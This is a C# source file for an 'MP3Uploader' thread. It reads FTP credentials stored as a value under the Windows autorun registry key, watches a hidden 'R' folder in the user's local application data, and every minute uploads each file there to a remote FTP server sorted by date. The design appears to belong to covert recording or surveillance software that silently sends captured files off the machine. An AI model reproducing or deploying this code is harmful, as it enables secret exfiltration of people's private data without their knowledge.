using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using Microsoft.Win32;

namespace MP3Uploader
{
    class FileUploaderThread
    {
        ftp ftpClient = null;

        Boolean m_bRunning = true;
        public void setThreadFlag(Boolean flag)
        {
            m_bRunning = flag;
        }

        protected virtual bool IsFileLocked(String path)
        {
            try
            {
                FileInfo file = new FileInfo(path);

                using (FileStream stream = file.Open(FileMode.Open, FileAccess.Read, FileShare.None))
                {
                    stream.Close();
                }
            }
            catch (IOException)
            {
                //the file is unavailable because it is:
                //still being written to
                //or being processed by another thread
                //or does not exist (has already been processed)
                return true;
            }

            //file is not locked
            return false;
        }


        public void run()
        {
            String ip = "", username = "", password = "";
            try
            {
                RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
                object currentValue = read.GetValue("FTPSetting");

                string val = "";
                if (currentValue != null)
                    val = currentValue.ToString();

                String[] value_list = val.Split('|');
                if (value_list.Length > 0)
                    ip = value_list[0];

                if (value_list.Length > 1)
                    username = value_list[1];

                if (value_list.Length > 2)
                    password = value_list[2];
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            ftpClient = new ftp(@"ftp://" + ip + "/", username, password);
            
            String app_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            Console.WriteLine(app_data_path);

            String record_path = app_data_path + "\\R";
            while (m_bRunning)
            {
                try
                {
                    DateTime now = DateTime.Now;

                    string[] files = Directory.GetFiles(record_path);
                    foreach (string file in files)
                    {
                        if (IsFileLocked(file))
                            continue;

                        String filename = Path.GetFileName(file);

                        String upload_path = now.Year + "";
                        ftpClient.createDirectory(upload_path);
                        upload_path += "/" + now.Month;
                        ftpClient.createDirectory(upload_path);
                        upload_path += "/" + now.Day;
                        ftpClient.createDirectory(upload_path);
                        upload_path += "/" + filename;

                        ftpClient.upload(upload_path, file);

                        // File.Delete(file);                        
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }

                Thread.Sleep(60 * 1000);
            }
            ftpClient = null;
        }
    }
}
